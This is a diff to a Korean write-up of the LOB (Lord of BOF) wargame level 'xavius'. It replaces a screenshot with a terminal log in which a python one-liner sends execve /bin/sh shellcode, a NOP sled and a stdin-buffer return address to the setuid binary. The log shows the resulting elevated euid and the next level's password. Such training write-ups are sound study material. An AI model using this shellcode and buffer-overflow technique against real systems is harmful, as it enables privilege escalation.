@@ -129,8 +129,6 @@ stdin 구조체에 따라 보면, std+4는 어디까지 읽었는지, stdin+8은
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/19.xavius/image-20180802131232591.png" width="700px">
 
-
-
 실제 메모리 맵을 살펴보면, 해당 영역은 실행 권한이 존재하지 않는다. 하지만 maps에 대한 정보는 100% 정확하지 않다는 얘기를 들어서 시도해 보았다.
 
 -----
@@ -141,15 +139,21 @@ stdin 구조체에 따라 보면, std+4는 어디까지 읽었는지, stdin+8은
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-
-
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/19.xavius/image-20180802131641059.png" width="700px">
+```
+[nightmare@localhost nightmare]$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
+\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*20+"\x00\x50\x01\x40"';cat)|./xavius
+1픐h//shh/bin됥PS됣솻
+                     ?릱릱릱릱릱릱릱릱릱릱
+id
+uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
+my-pass
+euid = 519
+throw me away
+```
 
 
 
 공격에 성공 하는것으로 보아 **maps에 대한 정보는 정확하지 않다는 것이 증명되었다.**
-
-> stdin시작주소에 1을 더한 이유는 \x00 을 없애기 위함이다.
 
 -----
 
@@ -184,4 +188,3 @@ throw me away
 ```
 
 -----
-
